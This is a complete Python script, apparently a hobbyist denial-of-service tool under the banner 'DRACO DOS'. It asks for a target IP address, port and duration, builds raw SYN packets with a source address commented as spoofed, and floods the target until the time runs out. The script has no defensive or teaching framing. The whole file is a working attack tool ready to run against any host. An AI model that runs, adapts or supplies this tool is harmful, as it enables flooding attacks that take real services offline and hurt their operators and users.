import socket
import random
import time
import os
import sys
import struct
from colorama import Fore, Style, init

init()

def check_root():
    """Check if the script is running with administrator privileges"""
    if os.name == 'nt':  # Windows
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("This script requires administrator privileges. Please run as administrator.")
            sys.exit(1)

def rainbow_text(text):
    """Convert text to rainbow colors"""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    colored_text = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        colored_text += f"{color}{char}"
    return colored_text + Style.RESET_ALL

def calculate_checksum(data):
    """Calculate the checksum for the packet"""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!{}H'.format(len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_packet(target_ip, target_port):
    """Create a SYN packet"""
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40  # 20 bytes IP + 20 bytes TCP
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton('0.0.0.0')  # Spoofed source
    ip_daddr = socket.inet_aton(target_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver, ip_tos, ip_tot_len,
                            ip_id, ip_frag_off, ip_ttl,
                            ip_proto, ip_check, ip_saddr, ip_daddr)

    # TCP Header
    source_port = random.randint(1024, 65535)
    seq = 0
    ack_seq = 0
    doff = 5  # Data offset
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4)
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH',
                             source_port, target_port,
                             seq, ack_seq,
                             offset_res, tcp_flags,
                             window, check, urg_ptr)

    # Pseudo header for checksum
    source_address = socket.inet_aton('0.0.0.0')
    dest_address = socket.inet_aton(target_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH',
                      source_address, dest_address,
                      placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcp_check = calculate_checksum(psh)
    tcp_header = struct.pack('!HHLLBBHHH',
                             source_port, target_port,
                             seq, ack_seq,
                             offset_res, tcp_flags,
                             window, tcp_check, urg_ptr)

    # Final packet
    packet = ip_header + tcp_header
    return packet

def syn_flood(target_ip, target_port, duration):
    """Perform a SYN flood attack"""
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        start_time = time.time()
        packet_count = 0
        
        print(rainbow_text(f"\nStarting SYN flood attack on {target_ip}:{target_port}..."))
        
        while time.time() - start_time < duration:
            try:
                packet = create_packet(target_ip, target_port)
                sock.sendto(packet, (target_ip, 0))  # 0 for raw socket
                packet_count += 1
                print(rainbow_text(f"Sent packet #{packet_count} to {target_ip}:{target_port}"))
                time.sleep(0.01)  # Small delay to prevent overwhelming the system
            except Exception as e:
                print(rainbow_text(f"Error sending packet: {e}"))
                break
        
        print(rainbow_text(f"\nAttack completed!"))
        print(rainbow_text(f"Total packets sent: {packet_count}"))
        
    except PermissionError:
        print(rainbow_text("Error: You need administrator privileges to run this tool."))
    except Exception as e:
        print(rainbow_text(f"An error occurred: {e}"))
    finally:
        sock.close()

def main():
    check_root()
    print(rainbow_text("""
    ██████╗ ██████╗  █████╗  ██████╗ ██████╗     ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔═══██╗    ██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██████╔╝███████║██║     ██║   ██║    ██║  ██║██║   ██║███████╗
    ██║  ██║██╔══██╗██╔══██║██║     ██║   ██║    ██║  ██║██║   ██║╚════██║
    ██████╔╝██║  ██║██║  ██║╚██████╗╚██████╔╝    ██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝     ╚═════╝  ╚═════╝ ╚══════╝
    """))
    
    try:
        target_ip = input(rainbow_text("Enter target IP address: "))
        target_port = int(input(rainbow_text("Enter target port: ")))
        duration = int(input(rainbow_text("Enter attack duration (seconds): ")))
        
        syn_flood(target_ip, target_port, duration)
        
    except ValueError:
        print(rainbow_text("Invalid input. Please enter valid numbers."))
    except KeyboardInterrupt:
        print(rainbow_text("\nAttack stopped by user."))

if __name__ == "__main__":
    main()
    input()
    input()
    input()
    
